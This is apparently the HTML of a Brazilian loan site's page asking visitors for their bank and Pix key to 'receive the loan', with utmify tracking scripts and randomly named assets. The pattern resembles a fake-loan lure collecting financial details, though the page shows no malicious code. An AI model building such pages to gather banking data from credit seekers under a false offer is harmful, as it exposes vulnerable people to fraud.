<!DOCTYPE html><html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Ágil Empréstimos - Dados Bancários</title>

    <link rel="stylesheet" href="css/mV3zvLmCXh5a.css">
    <script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>

<script>
  window.pixelId = "67fa9fdc8cab4ab13ec41fd0";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
</head>

<body>
    <div class="container">
        <div class="header" style="background-color: white; padding: 18px; display: flex; justify-content: center;">
            <img src="images/logo.png" alt="" style="width: 100%; max-width: 180px;">
        </div>

        <div class="content">
            <h1>Informe seus dados bancários</h1>

            <p class="subtitle">Selecione seu banco e informe sua Chave Pix para receber o empréstimo</p>

            <form id="pixForm">
                <div class="form-group">
                    <label for="bank">Banco</label>

                    <div class="search-container">
                        <input type="text" id="bankSearch" placeholder="Digite o nome do seu banco" autocomplete="off">

                        <div id="bankList" class="bank-list"></div>
                    </div>
                </div>

                <div class="form-group">
                    <label for="pixKey">Chave Pix</label>
                    
                    <input type="text" id="pixKey" placeholder="CPF, telefone, e-mail ou chave aleatória">
                </div>

                <button type="submit" class="continue-btn">Continuar</button>
            </form>
        </div>
    </div>

    <script src="js/dKdci19BSvRr.js"></script>
